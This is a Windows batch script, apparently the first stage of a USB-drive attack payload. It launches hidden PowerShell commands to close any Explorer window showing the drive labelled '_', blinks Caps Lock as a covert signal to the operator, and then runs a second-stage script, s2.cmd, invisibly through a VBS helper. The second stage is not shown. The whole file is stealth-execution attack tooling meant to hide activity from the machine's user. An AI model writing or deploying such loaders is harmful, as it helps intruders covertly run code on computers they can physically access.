@echo off
REM this is stage #1 (window is visible - make your stuff happen QUICK)

REM close potential Windows Explorer window of our flash drive (labelled "_")
start /b powershell -NoP -W Hidden -Sta -Command "$a = New-Object -Com 'Shell.Application'; ($a.windows() | ? { ($_.FullName -like '*\explorer.exe') -and ($_.LocationName -like '_*') }).Quit()"

REM blink CAPSLOCK 1x short, 1x long
start /b /wait powershell -NoP -W Hidden -Sta -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{CAPSLOCK}'); sleep -m 200; $wsh.SendKeys('{CAPSLOCK}'); sleep -m 200; $wsh.SendKeys('{CAPSLOCK}'); sleep -m 1000; $wsh.SendKeys('{CAPSLOCK}'); sleep -m 200;"

REM run stage #2 (invisibly)
cscript "%~dp0\invisibly_run.vbs" "%~dp0\s2.cmd"